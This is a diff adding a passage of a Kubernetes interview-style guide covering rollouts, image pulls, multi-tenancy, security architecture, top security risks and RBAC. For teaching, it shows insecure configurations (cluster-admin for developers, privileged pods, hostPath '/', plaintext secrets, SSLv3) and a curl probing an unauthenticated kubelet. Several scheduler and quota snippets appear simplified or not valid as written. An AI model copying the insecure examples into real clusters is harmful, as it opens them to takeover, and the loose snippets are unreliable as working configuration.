+apiVersion: policy/v1
+kind: PodDisruptionBudget
+spec:
+  minAvailable: 80%
+  selector:
+    matchLabels:
+      app: my-app
+```
+
+PDB ensures capacity during rollout (and other disruptions).
+
+**Strategy 10: Optimize for many replicas**
+
+For large deployments (100+ replicas):
+
+```yaml
+rollingUpdate:
+  maxSurge: 10%         # 10 pods at a time
+  maxUnavailable: 0
+```
+
+Don't try to update all at once. Gradual is safer.
+
+**Rollout monitoring:**
+
+```bash
+# Watch rollout:
+kubectl rollout status deployment/my-app
+
+# History:
+kubectl rollout history deployment/my-app
+
+# Pause if needed:
+kubectl rollout pause deployment/my-app
+
+# Resume:
+kubectl rollout resume deployment/my-app
+
+# Rollback:
+kubectl rollout undo deployment/my-app
+```
+
+**Production scenarios:**
+
+1. **Slow rollouts blocked CI**: 100-pod deployment took 30 min. Reduced via maxSurge: 50% and image pre-pulling. Now: 5 min.
+
+2. **Blue-green for database migration**: New deployment needed schema migration. Blue-green allowed test on green before traffic switch. Instant cutover, safe rollback.
+
+3. **Canary caught regression**: New version had subtle bug. Canary with metric-based promotion detected error rate increase at 10% traffic. Auto-rolled back. Most users unaffected.
+
+4. **PDB prevented capacity loss**: Without PDB, simultaneous evictions during rollout dropped capacity by 50%. Added PDB minAvailable: 80%. Capacity maintained.
+
+5. **Progressive delivery for safety**: All deployments via Flagger. Automatic canary, metric-based promotion. Caught 3 bad deploys in past quarter before customer impact.
+
+---
+
+## 219. Explain parallel image pulls
+
+By default, kubelet pulls images one at a time (serial). For multi-container pods or new nodes with many images, this is slow. Parallel pulls speed it up.
+
+**Default behavior:**
+
+```yaml
+# kubelet:
+serializeImagePulls: true   # Default
+```
+
+One image pulled at a time per node.
+
+Rationale:
+- Avoid network saturation
+- Prevent rate limits
+- Disk I/O constraints
+
+**Problem with serial:**
+
+Pod with 5 containers (e.g., sidecars):
+- 5 images, 30s each
+- Serial: 150s
+- Parallel: 30s (if simultaneous)
+
+**Enabling parallel:**
+
+```yaml
+# kubelet config:
+serializeImagePulls: false
+maxParallelImagePulls: 5
+```
+
+Now: up to 5 images pulled simultaneously.
+
+**Considerations:**
+
+**Consideration 1: Network bandwidth**
+
+Multiple parallel pulls share network:
+- Fast network: no issue
+- Slow network: each pull slower
+
+**Consideration 2: Registry rate limits**
+
+Docker Hub: anonymous pulls limited (100/6h)
+Authenticated: 200/6h
+
+Parallel pulls can hit rate limits faster.
+
+Mitigation:
+- Use private registry
+- Authenticate to Docker Hub
+- Pull-through cache
+
+**Consideration 3: Disk I/O**
+
+Image extraction is disk-intensive:
+- Multiple parallel extractions compete
+- Slow disks become bottleneck
+
+**Consideration 4: Memory**
+
+Each parallel pull uses memory for decompression. With many parallel, memory pressure possible.
+
+**Tuning:**
+
+```yaml
+# kubelet:
+serializeImagePulls: false
+maxParallelImagePulls: 3   # Conservative
+# Or:
+maxParallelImagePulls: 10  # Aggressive
+```
+
+Right value depends on:
+- Network speed
+- Disk speed
+- Registry capabilities
+- Memory available
+
+**When parallel helps:**
+
+**Scenario 1: Cold nodes**
+
+New node joining cluster needs many images:
+
+```
+Workload requires: app, sidecar1, sidecar2, monitoring, log-shipper
+Serial pull: 5 × 30s = 150s
+Parallel pull: ~30-40s
+```
+
+**Scenario 2: Mass deployment**
+
+Many pods starting simultaneously:
+
+```
+50 pods with new image
+50 nodes, each pulls image once
+Parallel pulls speed up overall deployment
+```
+
+**Scenario 3: Multi-container pods**
+
+Pods with sidecars (Istio, monitoring, etc.):
+
+```
+Main container: 200MB
+Istio sidecar: 100MB
+Log sidecar: 50MB
+Monitoring: 30MB
+
+Parallel: faster pod startup
+```
+
+**Image streaming alternatives:**
+
+For very large images, parallel still slow. Alternatives:
+
+**eStargz / SOCI / Nydus:**
+
+Lazy-loading image formats:
+
+```yaml
+# containerd config with SOCI:
+[plugins."io.containerd.snapshotter.v1.soci"]
+  # Configuration
+```
+
+Container starts before full pull. Files fetched on demand.
+
+**Benefits:**
+- Start time: seconds vs. minutes for large images
+- Lazy fetch only what's needed
+- Particularly good for ML models
+
+**Image pre-pulling:**
+
+Skip pull during pod start by pre-pulling:
+
+```yaml
+# DaemonSet that pulls images on every node:
+apiVersion: apps/v1
+kind: DaemonSet
+metadata:
+  name: image-prepuller
+spec:
+  template:
+    spec:
+      initContainers:
+        - name: prepull-app
+          image: my-app:v1
+          command: ["true"]
+        - name: prepull-sidecar
+          image: my-sidecar:v1
+          command: ["true"]
+      containers:
+        - name: pause
+          image: registry.k8s.io/pause:3.9
+```
+
+After running on all nodes:
+- All nodes have images cached
+- New pods of these images: no pull, instant start
+
+**Registry mirror / cache:**
+
+Local mirror reduces pull time:
+
+```yaml
+# containerd mirror config:
+[plugins."io.containerd.grpc.v1.cri".registry.mirrors."docker.io"]
+  endpoint = ["https://my-region-mirror.example.com", "https://registry-1.docker.io"]
+```
+
+Pull from local mirror first, fall back to upstream.
+
+**Pull policy:**
+
+```yaml
+imagePullPolicy: Always       # Always pull (default for :latest)
+imagePullPolicy: IfNotPresent # Use cached if present (default for tagged)
+imagePullPolicy: Never        # Use cached, never pull
+```
+
+For predictable workloads, use IfNotPresent to maximize cache use.
+
+**Monitoring image pulls:**
+
+```promql
+# Pull duration:
+histogram_quantile(0.99,
+  rate(kubelet_runtime_operations_duration_seconds_bucket{operation_type="pull_image"}[5m])
+)
+
+# Pull errors:
+rate(kubelet_runtime_operations_errors_total{operation_type="pull_image"}[5m])
+
+# Images on each node:
+node_imageinfo  # Per-image labels
+```
+
+**Production scenarios:**
+
+1. **Parallel pulls for service mesh**: Istio sidecar pull added 30s to every pod startup. Combined with main image: 60s serial. Enabled parallel: 30s. Saved 30s per pod startup.
+
+2. **Cold node provisioning**: New nodes joining had to pull 20+ images for various workloads. Serial: 10 min. Parallel + pre-pulling: 2 min. Faster scaling.
+
+3. **Docker Hub rate limit hit**: Parallel pulls during mass scale hit Docker Hub rate limit. Solution: authenticated pulls + private mirror.
+
+4. **eStargz for ML models**: 8 GB ML model image. Standard pull: 12 min. eStargz: container starts in 30s. Model loaded on first inference.
+
+5. **Pre-pulling for known events**: Before Black Friday, pre-pulled latest images to all nodes. During scaling event, no pull delays. Faster response to load.
+
+---
+
+## 220. How do you optimize multi-tenant clusters?
+
+Multi-tenant clusters host workloads from multiple teams or customers in the same cluster. Optimization requires balancing isolation, fairness, and efficiency.
+
+**Multi-tenancy challenges:**
+
+**Challenge 1: Resource isolation**
+
+One tenant can consume all resources:
+- CPU/memory hogging
+- Storage filling
+- Network bandwidth
+
+**Challenge 2: Security isolation**
+
+Tenants shouldn't access each other:
+- Pod-to-pod isolation
+- Secret access
+- API access
+
+**Challenge 3: Fair scheduling**
+
+Some tenants shouldn't always get priority over others.
+
+**Challenge 4: Cost allocation**
+
+Knowing which tenant uses what resources.
+
+**Challenge 5: Operational isolation**
+
+One tenant's issues shouldn't affect others.
+
+**Multi-tenancy levels:**
+
+**Level 1: Soft multi-tenancy (trust-based)**
+
+Same organization, different teams:
+- Namespaces per team
+- RBAC for access control
+- Resource quotas
+- Network policies
+
+Most common.
+
+**Level 2: Hard multi-tenancy**
+
+Different organizations or untrusted code:
+- Strong isolation needed
+- Often separate clusters
+- vClusters or virtual control planes
+- Strict resource boundaries
+
+Less common, more complex.
+
+**Soft multi-tenancy strategies:**
+
+**Strategy 1: Namespace per tenant**
+
+```yaml
+apiVersion: v1
+kind: Namespace
+metadata:
+  name: team-a
+  labels:
+    tenant: team-a
+```
+
+Namespaces provide:
+- Resource scoping
+- RBAC boundary
+- ResourceQuota target
+
+**Strategy 2: ResourceQuota**
+
+```yaml
+apiVersion: v1
+kind: ResourceQuota
+metadata:
+  name: team-a-quota
+  namespace: team-a
+spec:
+  hard:
+    requests.cpu: "100"
+    requests.memory: "200Gi"
+    limits.cpu: "200"
+    limits.memory: "400Gi"
+    pods: "500"
+    services: "100"
+    persistentvolumeclaims: "50"
+    configmaps: "200"
+    secrets: "100"
+```
+
+Prevents one tenant from consuming everything.
+
+**Strategy 3: LimitRange**
+
+```yaml
+apiVersion: v1
+kind: LimitRange
+metadata:
+  name: defaults
+  namespace: team-a
+spec:
+  limits:
+    - default:
+        cpu: 500m
+        memory: 512Mi
+      defaultRequest:
+        cpu: 100m
+        memory: 128Mi
+      max:
+        cpu: "4"
+        memory: 8Gi
+      type: Container
+```
+
+Sets defaults and max for pods.
+
+**Strategy 4: NetworkPolicies**
+
+```yaml
+apiVersion: networking.k8s.io/v1
+kind: NetworkPolicy
+metadata:
+  name: deny-from-other-tenants
+  namespace: team-a
+spec:
+  podSelector: {}
+  policyTypes: [Ingress]
+  ingress:
+    - from:
+        - namespaceSelector:
+            matchLabels:
+              tenant: team-a
+```
+
+Tenants only communicate within their namespace.
+
+**Strategy 5: RBAC**
+
+```yaml
+apiVersion: rbac.authorization.k8s.io/v1
+kind: Role
+metadata:
+  namespace: team-a
+  name: team-a-developer
+rules:
+  - apiGroups: [""]
+    resources: ["pods", "services"]
+    verbs: ["get", "list", "create", "update", "delete"]
+
+---
+apiVersion: rbac.authorization.k8s.io/v1
+kind: RoleBinding
+metadata:
+  namespace: team-a
+  name: team-a-bind
+subjects:
+  - kind: Group
+    name: team-a-users
+roleRef:
+  kind: Role
+  name: team-a-developer
+```
+
+Tenants get access only to their namespace.
+
+**Strategy 6: Priority classes**
+
+```yaml
+apiVersion: scheduling.k8s.io/v1
+kind: PriorityClass
+metadata:
+  name: production
+value: 1000
+
+---
+apiVersion: scheduling.k8s.io/v1
+kind: PriorityClass
+metadata:
+  name: dev
+value: 100
+```
+
+Higher priority tenants get resources first when contended.
+
+**Strategy 7: Node pools per tenant**
+
+For stronger isolation:
+
+```yaml
+# Node pool for tenant A:
+nodes labeled with tenant: a, tainted
+
+# Pods of tenant A:
+nodeSelector:
+  tenant: a
+tolerations:
+  - key: tenant
+    operator: Equal
+    value: a
+    effect: NoSchedule
+```
+
+Different physical nodes per tenant.
+
+Pros: complete resource isolation, blast radius limited
+Cons: less efficient, more nodes
+
+**Strategy 8: Pod Security Standards**
+
+```yaml
+apiVersion: v1
+kind: Namespace
+metadata:
+  name: team-a
+  labels:
+    pod-security.kubernetes.io/enforce: restricted
+    pod-security.kubernetes.io/audit: restricted
+    pod-security.kubernetes.io/warn: restricted
+```
+
+Enforce security baseline per namespace.
+
+**Hard multi-tenancy strategies:**
+
+**Strategy 1: vClusters**
+
+Virtual clusters within a host cluster:
+
+```yaml
+# vCluster provides:
+# - Separate API server per tenant
+# - Separate etcd
+# - Isolated pod and Service namespaces
+# - Tenant sees a full cluster
+```
+
+Tools: vcluster.com
+
+**Strategy 2: Multiple clusters**
+
+Strongest isolation: separate clusters per tenant.
+
+Trade-off: operational overhead, cost.
+
+**Strategy 3: Sandboxed runtimes**
+
+gVisor, Kata Containers:
+
+```yaml
+apiVersion: node.k8s.io/v1
+kind: RuntimeClass
+metadata:
+  name: gvisor
+handler: runsc
+
+---
+# Pod uses sandbox:
+spec:
+  runtimeClassName: gvisor
+```
+
+Strong process isolation, kernel separation.
+
+**Fair scheduling:**
+
+**Capacity scheduling plugin:**
+
+```yaml
+profiles:
+  - schedulerName: capacity-scheduler
+    plugins:
+      score:
+        enabled:
+          - name: CapacityScheduling
+            args:
+              tenantClass:
+                - name: team-a
+                  share: 50
+                - name: team-b
+                  share: 30
+                - name: team-c
+                  share: 20
+```
+
+Tenants get fair share of cluster capacity.
+
+**Hierarchical Resource Quota:**
+
+```yaml
+# Track quota across multiple namespaces:
+apiVersion: scheduling.x-k8s.io/v1alpha1
+kind: ElasticQuota
+metadata:
+  name: team-a
+spec:
+  guarantee: 100   # Min guaranteed CPU
+  max: 200         # Max can borrow
+```
+
+When team-a doesn't use full quota, others can borrow.
+
+**Cost allocation:**
+
+**Labels for cost tracking:**
+
+```yaml
+metadata:
+  labels:
+    team: team-a
+    cost-center: engineering
+    environment: production
+```
+
+Use kubecost or similar:
+
+```
+Cluster cost: $50,000/month
+- Team A: 40% = $20,000
+- Team B: 35% = $17,500
+- Team C: 25% = $12,500
+```
+
+Show teams their costs, encourage optimization.
+
+**Operational best practices:**
+
+**Best practice 1: Self-service onboarding**
+
+New tenant = automated:
+- Create namespace
+- Apply resource quota
+- Set up RBAC
+- Configure network policies
+- Create monitoring dashboards
+
+Tools: Capsule, kiosk, Hierarchical Namespace Controller (HNC).
+
+**Best practice 2: Tenant SLOs**
+
+Different tiers:
+- Premium: Guaranteed QoS, dedicated nodes
+- Standard: Burstable, shared nodes
+- Best-effort: No guarantees
+
+**Best practice 3: Monitoring per tenant**
+
+```promql
+# Per-tenant metrics:
+sum(container_cpu_usage_seconds_total{namespace=~"team-.*"}) by (namespace)
+sum(kube_pod_container_status_restarts_total) by (namespace)
+```
+
+Each tenant sees their own dashboards.
+
+**Best practice 4: Audit logging**
+
+Track who did what:
+
+```yaml
+# kube-apiserver:
+--audit-policy-file=/etc/kubernetes/audit-policy.yaml
+--audit-log-path=/var/log/audit.log
+```
+
+Useful for security and tenant accountability.
+
+**Best practice 5: Automated cleanup**
+
+Tenants leave resources:
+- Old failed pods
+- Unused PVCs
+- Old ReplicaSets
+
+CronJobs to clean up. TTL on Jobs.
+
+**Tools for multi-tenancy:**
+
+**Capsule:**
+
+Tenant management framework:
+
+```yaml
+apiVersion: capsule.clastix.io/v1beta2
+kind: Tenant
+metadata:
+  name: team-a
+spec:
+  owners:
+    - name: alice
+      kind: User
+  resourceQuotas:
+    items:
+      - hard:
+          requests.cpu: "100"
+  namespaceOptions:
+    quota: 10   # Up to 10 namespaces
+```
+
+Manages tenant lifecycle.
+
+**HNC (Hierarchical Namespace Controller):**
+
+Parent-child namespace relationships:
+
+```
+parent-namespace/
+  child-1/
+  child-2/
+```
+
+Inheritance of policies, RBAC.
+
+**vCluster:**
+
+Virtual clusters for stronger isolation.
+
+**Common pitfalls:**
+
+**Pitfall 1: No quotas**
+
+Tenants can consume cluster. Always set quotas.
+
+**Pitfall 2: Overly permissive RBAC**
+
+Cluster-admin for tenants. Should be limited.
+
+**Pitfall 3: Missing network policies**
+
+Default-allow networking. Tenants can attack each other.
+
+**Pitfall 4: Single cluster for everything**
+
+Trying to fit everything in one cluster. Sometimes separate clusters are right.
+
+**Pitfall 5: No cost visibility**
+
+Tenants don't know their cost, no incentive to optimize.
+
+**Production scenarios:**
+
+1. **Soft multi-tenancy with quotas**: 50 teams sharing cluster. Each namespace with quota, RBAC, NetworkPolicies. Worked well for trusted teams.
+
+2. **Dedicated nodes for finance team**: Finance team needed isolated nodes for compliance. Tainted nodes, finance pods tolerated taint. Other teams couldn't schedule there.
+
+3. **vCluster for customer isolation**: SaaS product offered per-customer Kubernetes-like environment. Used vCluster. Each customer thought they had own cluster.
+
+4. **Cost showback led to optimization**: Kubecost integrated. Teams saw their monthly cost. Cost-conscious behavior emerged. Total cluster cost dropped 25%.
+
+5. **Failed multi-tenancy attempt**: Tried to run dev/staging/prod in single cluster. Different teams' issues affected each other. Migrated to separate clusters per environment. Operational clarity improved.
+
+# Kubernetes Security & Compliance (221-240)
+
+## 221. Explain Kubernetes security architecture
+
+Kubernetes security spans multiple layers, each requiring its own controls. Understanding the architecture helps identify where defenses apply and where gaps might exist.
+
+**The 4Cs of cloud-native security:**
+
+A common framework for thinking about Kubernetes security:
+
+**Cloud (or infrastructure):**
+- The underlying VMs, hypervisor, hardware
+- Cloud provider's security (IAM, VPC, encryption)
+- Physical security
+- Network infrastructure
+
+**Cluster:**
+- Control plane components (API server, etcd, scheduler)
+- Worker node OS and runtime
+- Cluster-level configuration
+- Authentication, authorization, audit
+
+**Container:**
+- Image security (no vulnerabilities, signed)
+- Runtime configuration (non-root, capabilities, seccomp)
+- Container runtime security (containerd, gVisor)
+
+**Code:**
+- Application code itself
+- Dependencies
+- Secrets handling
+- Input validation
+
+Each layer needs its own controls.
+
+**The security model:**
+
+Kubernetes uses defense-in-depth. Multiple layers of controls so a breach at one layer doesn't compromise everything.
+
+**Component-level security:**
+
+**API server:**
+- Front door to the cluster
+- Authentication (who you are)
+- Authorization (what you can do)
+- Admission control (policy enforcement)
+- Audit logging (what was done)
+- TLS for all communication
+
+**etcd:**
+- Holds all cluster state
+- Must be encrypted at rest
+- TLS for all communication
+- Restricted access (only API server should talk to it)
+
+**Kubelet:**
+- Authenticates to API server
+- Authorized for limited operations
+- Manages pods on its node
+- Vulnerabilities here can affect node and pods on it
+
+**Container runtime:**
+- containerd, CRI-O
+- Container isolation via cgroups, namespaces
+- Optional: sandboxed runtimes (gVisor, Kata)
+
+**Networking:**
+- CNI plugin handles pod networking
+- Service mesh adds encryption and authentication
+- NetworkPolicies for segmentation
+
+**Authentication flow:**
+
+```
+Request → TLS termination → Authentication
+                              ↓
+                          Identity established (user, group)
+                              ↓
+                          Authorization
+                              ↓
+                          Permitted action?
+                              ↓
+                          Admission controllers
+                              ↓
+                          Mutation (e.g., add sidecars)
+                              ↓
+                          Validation (e.g., security policies)
+                              ↓
+                          etcd write
+                              ↓
+                          Watch event distribution
+```
+
+Every API request goes through this. Each step is a security checkpoint.
+
+**Authentication methods:**
+
+- **X.509 certificates**: client certs for users
+- **Bearer tokens**: service account tokens, OIDC tokens
+- **Service account tokens**: for in-cluster workloads
+- **OIDC**: integrate with external identity providers (Google, Okta, AD)
+- **Webhook**: custom authentication backends
+
+**Authorization mechanisms:**
+
+- **RBAC** (Role-Based Access Control): standard, most used
+- **ABAC** (Attribute-Based): legacy, rarely used
+- **Webhook**: external authorization
+- **Node**: special authorization for kubelet
+
+**Admission controllers:**
+
+Run after authorization but before persistence:
+
+- **Mutating**: modify the request (e.g., inject sidecars)
+- **Validating**: approve or deny (e.g., reject privileged pods)
+
+Built-in admission controllers:
+- PodSecurity (Pod Security Standards)
+- ResourceQuota
+- LimitRanger
+- ServiceAccount
+- DefaultStorageClass
+
+External admission webhooks:
+- OPA Gatekeeper
+- Kyverno
+- Custom policy engines
+
+**Workload identity:**
+
+Pods get identity via service accounts:
+
+```yaml
+spec:
+  serviceAccountName: my-app-sa
+```
+
+ServiceAccount → token (mounted in pod) → API server access.
+
+For cloud resources, link to cloud IAM:
+- IRSA (IAM Roles for Service Accounts) on AWS
+- Workload Identity on GCP
+- Pod Identity on Azure
+
+**Pod-level security:**
+
+```yaml
+spec:
+  securityContext:
+    runAsNonRoot: true
+    runAsUser: 1000
+    fsGroup: 2000
+    seccompProfile:
+      type: RuntimeDefault
+  containers:
+    - name: app
+      securityContext:
+        readOnlyRootFilesystem: true
+        allowPrivilegeEscalation: false
+        capabilities:
+          drop: [ALL]
+```
+
+Multiple controls:
+- Non-root execution
+- Read-only filesystem
+- Drop capabilities
+- Seccomp profiles
+- AppArmor/SELinux
+
+**Network security:**
+
+```yaml
+apiVersion: networking.k8s.io/v1
+kind: NetworkPolicy
+metadata:
+  name: restrict-traffic
+spec:
+  podSelector:
+    matchLabels:
+      app: my-app
+  policyTypes: [Ingress, Egress]
+  ingress:
+    - from:
+        - podSelector:
+            matchLabels:
+              role: frontend
+  egress:
+    - to:
+        - podSelector:
+            matchLabels:
+              role: database
+      ports:
+        - port: 5432
+```
+
+Default Kubernetes networking: all pods can talk to all pods. NetworkPolicies restrict.
+
+**Secrets:**
+
+```yaml
+apiVersion: v1
+kind: Secret
+metadata:
+  name: db-credentials
+type: Opaque
+data:
+  password: <base64>
+```
+
+Storage:
+- Base64 in etcd (not encrypted by default)
+- Encryption at rest configuration
+- External: Vault, AWS Secrets Manager
+
+**Audit logging:**
+
+```yaml
+# audit policy:
+apiVersion: audit.k8s.io/v1
+kind: Policy
+rules:
+  - level: RequestResponse
+    resources:
+      - group: ""
+        resources: ["secrets"]
+  - level: Metadata
+    resources:
+      - group: ""
+        resources: ["pods"]
+```
+
+Records who did what. Critical for security investigation.
+
+**Defense in depth example:**
+
+A malicious pod tries to escape:
+
+1. Pod Security Standards (PSS) prevents privileged containers
+2. AppArmor profile restricts syscalls
+3. Seccomp blocks dangerous operations
+4. NetworkPolicy limits where it can connect
+5. Service mesh requires mTLS authentication
+6. RBAC limits what API operations pod can do
+7. Audit log records suspicious activity
+8. Runtime security tool (Falco) alerts
+
+Even if one layer fails, others provide protection.
+
+**Security threats specific to Kubernetes:**
+
+- Misconfigured RBAC giving too much access
+- Privileged containers (mining crypto, escaping)
+- Exposed dashboard / API server
+- Unsecured kubelet
+- Insecure etcd
+- Compromised container images
+- Privileged service accounts
+- Default service account abuse
+
+**Production scenarios:**
+
+1. **Layer-based incident**: Attacker compromised app via SQL injection. RBAC limited service account to read-only of its own namespace. PSS prevented privilege escalation. Network policy blocked lateral movement. Damage minimal.
+
+2. **etcd encryption saved data**: Backup of etcd was leaked. Without encryption at rest, all secrets would have been exposed. Encryption meant the backup was useless to attacker.
+
+3. **OIDC integration**: Migrated from static kubeconfig to OIDC. Users authenticated via corporate SSO. Departures automatically lost access. Better security and compliance.
+
+4. **Admission webhook caught misconfig**: Developer tried to deploy with privileged: true. OPA Gatekeeper blocked. Without it, would have been a foothold for attacker.
+
+5. **Audit log diagnosis**: Customer reported data tampering. Audit logs showed exact API calls, by whom, when. Traced to compromised CI service account. Rotated credentials, fixed pipeline security.
+
+---
+
+## 222. What are the top Kubernetes security risks?
+
+Understanding common security risks helps prioritize defenses. These are the most prevalent and impactful security issues in production Kubernetes environments.
+
+**Risk 1: Misconfigured RBAC**
+
+Most common issue. Over-permissive roles:
+
+```yaml
+# Dangerous:
+apiVersion: rbac.authorization.k8s.io/v1
+kind: ClusterRoleBinding
+metadata:
+  name: developer-admin
+subjects:
+  - kind: Group
+    name: developers
+roleRef:
+  kind: ClusterRole
+  name: cluster-admin   # Full cluster access!
+  apiGroup: rbac.authorization.k8s.io
+```
+
+Impact: Any developer can do anything, including delete resources, access secrets across all namespaces.
+
+**Mitigation:**
+- Principle of least privilege
+- Avoid cluster-admin for users
+- Use namespace-scoped Roles
+- Regular RBAC audits
+
+**Risk 2: Exposed Kubernetes Dashboard**
+
+Default dashboard with no authentication, exposed publicly:
+
+```bash
+# Publicly accessible dashboard with token:
+http://my-cluster.example.com:8001
+```
+
+Impact: Full cluster control to anyone who finds the URL.
+
+**Famous incident:** Tesla had crypto miners running in their cluster via exposed dashboard.
+
+**Mitigation:**
+- Don't expose dashboard publicly
+- If used internally, require strong authentication
+- Better: use kubectl with proper RBAC
+
+**Risk 3: Privileged containers**
+
+```yaml
+spec:
+  containers:
+    - name: app
+      securityContext:
+        privileged: true   # Dangerous!
+```
+
+Privileged containers can:
+- Access host filesystem
+- Modify kernel
+- Escape to host
+
+**Mitigation:**
+- Enforce Pod Security Standards (PSS)
+- Use OPA Gatekeeper or Kyverno
+- Block privileged pods by default
+
+**Risk 4: Unsecured kubelet**
+
+```bash
+# Kubelet API exposed without auth:
+curl https://node-ip:10250/pods
+```
+
+Returns all pod info on the node. Worse, can exec into pods.
+
+**Mitigation:**
+- Enable kubelet authentication and authorization
+- Restrict access to kubelet port
+- Use webhook authentication
+
+**Risk 5: Insecure container images**
+
+Issues:
+- Known vulnerabilities (CVEs)
+- Outdated base images
+- Embedded secrets
+- Malicious code
+- Untrusted sources
+
+**Mitigation:**
+- Image scanning (Trivy, Clair, Snyk)
+- Use minimal base images (distroless, alpine)
+- Sign images (Cosign)
+- Verify signatures before deploy
+
+**Risk 6: Exposed secrets**
+
+```yaml
+# Bad: secrets in environment:
+env:
+  - name: DB_PASSWORD
+    value: "supersecret123"   # Visible in spec
+```
+
+Or in Git:
+```yaml
+# Secret manifest with base64 (NOT encryption):
+data:
+  password: c3VwZXJzZWNyZXQ=
+```
+
+**Mitigation:**
+- Never put secrets in code
+- Use Secret resources (encrypt etcd at rest)
+- External secret stores (Vault, AWS Secrets Manager)
+- Sealed Secrets for GitOps
+- Rotate regularly
+
+**Risk 7: Default service account abuse**
+
+Every pod has a service account by default. Default SA in many setups has unnecessary permissions.
+
+```yaml
+# Pod uses default SA:
+spec:
+  # serviceAccountName not specified, uses "default"
+  containers:
+    - name: app
+      image: my-app
+```
+
+If default SA has permissions, all pods get them.
+
+**Mitigation:**
+- Disable auto-mounting:
+```yaml
+spec:
+  automountServiceAccountToken: false
+```
+- Or only auto-mount when needed
+- Default SA should have zero permissions
+
+**Risk 8: Missing NetworkPolicies**
+
+Default: all pods can communicate with all pods.
+
+Attacker compromises one pod → free movement to all others.
+
+**Mitigation:**
+- Default-deny NetworkPolicy
+- Explicit allow for required communication
+- Per-namespace policies
+
+**Risk 9: Outdated Kubernetes version**
+
+Old versions have known CVEs. Some serious:
+- CVE-2018-1002105 (proxy request escalation)
+- CVE-2020-8554 (man-in-the-middle via service)
+- CVE-2022-3172 (aggregated API server)
+
+**Mitigation:**
+- Regular upgrades
+- Stay within supported versions
+- Subscribe to security announcements
+
+**Risk 10: Inadequate audit logging**
+
+Without audit logs, you can't investigate incidents.
+
+**Mitigation:**
+- Enable audit logging
+- Reasonable audit policy (don't log everything, log important)
+- Ship logs off-cluster
+- Retain for compliance period
+
+**Risk 11: Container runtime escape**
+
+Bugs in container runtime can let containers escape:
+- runC vulnerabilities
+- Kernel vulnerabilities
+
+**Mitigation:**
+- Keep runtime updated
+- Consider sandboxed runtimes (gVisor, Kata Containers) for untrusted code
+- Apply seccomp profiles
+
+**Risk 12: Supply chain attacks**
+
+Malicious packages, compromised CI/CD:
+- SolarWinds-style attacks
+- Compromised Docker Hub images
+- Poisoned npm/pip packages
+
+**Mitigation:**
+- Image scanning
+- SBOM (Software Bill of Materials)
+- Image signing (Cosign, Notary)
+- Provenance verification
+
+**Risk 13: Excessive workload permissions**
+
+Cloud workload identity (IRSA, Workload Identity) granting too much:
+
+```yaml
+# Pod can do anything in AWS:
+serviceAccountName: powerful-sa  # Has admin IAM role
+```
+
+**Mitigation:**
+- Least privilege IAM roles
+- Per-workload service accounts
+- Regular IAM audits
+
+**Risk 14: Misconfigured Ingress**
+
+```yaml
+# Ingress with weak TLS:
+metadata:
+  annotations:
+    nginx.ingress.kubernetes.io/ssl-protocols: "SSLv3"   # Insecure!
+```
+
+Or no TLS at all for sensitive endpoints.
+
+**Mitigation:**
+- Strong TLS configurations
+- Modern protocols only (TLS 1.2+)
+- Cert-manager for automatic renewal
+
+**Risk 15: Pod escaping via hostPath**
+
+```yaml
+volumeMounts:
+  - name: host
+    mountPath: /host
+volumes:
+  - name: host
+    hostPath:
+      path: /   # Full host access
+```
+
+Pod can read/modify host files.
+
+**Mitigation:**
+- PSS restricted profile prohibits hostPath
+- If needed, scope to specific paths
+- Strict policies
+
+**Top mitigations summary:**
+
+1. Enable Pod Security Standards
+2. Strict RBAC, no cluster-admin for users
+3. NetworkPolicies (default-deny)
+4. Image scanning in CI
+5. Encrypted secrets (external store)
+6. Audit logging enabled
+7. Regular upgrades
+8. Admission controllers (OPA, Kyverno)
+9. Monitor for runtime threats (Falco)
+10. Minimal container privileges
+
+**Production scenarios:**
+
+1. **Crypto miners in exposed dashboard**: Cluster's dashboard accessible internally with kubectl proxy. Developer's compromised machine exposed it. Miners deployed for months. Discovered via cost anomaly.
+
+2. **Privileged container escape**: A pod with privileged: true was compromised via vulnerable web app. Attacker escaped to host, accessed other pods. PSS now enforced.
+
+3. **Exposed secrets in environment variables**: Audit found database password in environment variables. kubectl describe pod showed plaintext. Migrated to external secrets manager.
+
+4. **Default SA used by everything**: Every pod used default SA in default namespace. Default SA had admin permissions due to misconfig. Any compromise = total compromise.
+
+5. **Outdated cluster with CVE-2022-3172**: Cluster on K8s 1.21 had vulnerability. Auditor flagged. Emergency upgrade required. Better: regular patch cadence.
+
+---
+
+## 223. Explain RBAC best practices
+
+RBAC (Role-Based Access Control) is Kubernetes's primary authorization mechanism. Proper RBAC is critical for security.
+
+**RBAC primitives:**
+
+**Roles:**
+
+```yaml
+apiVersion: rbac.authorization.k8s.io/v1
+kind: Role
+metadata:
+  namespace: production
+  name: pod-reader
+rules:
+  - apiGroups: [""]
+    resources: ["pods"]
+    verbs: ["get", "list", "watch"]
+```
+
+Namespace-scoped permissions.
+
+**ClusterRoles:**
+
+```yaml
+apiVersion: rbac.authorization.k8s.io/v1
+kind: ClusterRole
+metadata:
+  name: secret-reader
+rules:
+  - apiGroups: [""]
+    resources: ["secrets"]
+    verbs: ["get", "list"]
+```
+
+Cluster-wide permissions.
+
+**RoleBindings:**
+
+```yaml
+apiVersion: rbac.authorization.k8s.io/v1
+kind: RoleBinding
+metadata:
+  namespace: production
+  name: read-pods
+subjects:
+  - kind: User
+    name: jane
+    apiGroup: rbac.authorization.k8s.io
+roleRef:
+  kind: Role
+  name: pod-reader
+  apiGroup: rbac.authorization.k8s.io
+```
+
+Binds role to subjects (users, groups, ServiceAccounts) within a namespace.
+
+**ClusterRoleBindings:**
+
+```yaml
+apiVersion: rbac.authorization.k8s.io/v1
+kind: ClusterRoleBinding
+metadata:
+  name: read-secrets-global
+subjects:
+  - kind: Group
+    name: security-team
+    apiGroup: rbac.authorization.k8s.io
+roleRef:
+  kind: ClusterRole
+  name: secret-reader
+  apiGroup: rbac.authorization.k8s.io
+```
+
+Binds ClusterRole across all namespaces.
+
+**Best practice 1: Principle of least privilege**
+
+Grant minimum permissions needed:
+
+```yaml
+# Bad:
+verbs: ["*"]   # All actions
+
+# Better:
+verbs: ["get", "list"]   # Only what's needed
+```
+
+```yaml
+# Bad:
+resources: ["*"]   # All resources
+
+# Better:
+resources: ["pods", "services"]   # Specific resources
+```
+
+```yaml
+# Bad:
+apiGroups: ["*"]
+
+# Better:
+apiGroups: [""]   # Core API only
+```
+
+**Best practice 2: Avoid cluster-admin**
+
+```yaml
+# Never do this:
+subjects:
+  - kind: User
+    name: developer
+roleRef:
+  kind: ClusterRole
+  name: cluster-admin   # NEVER for regular users
+```
+
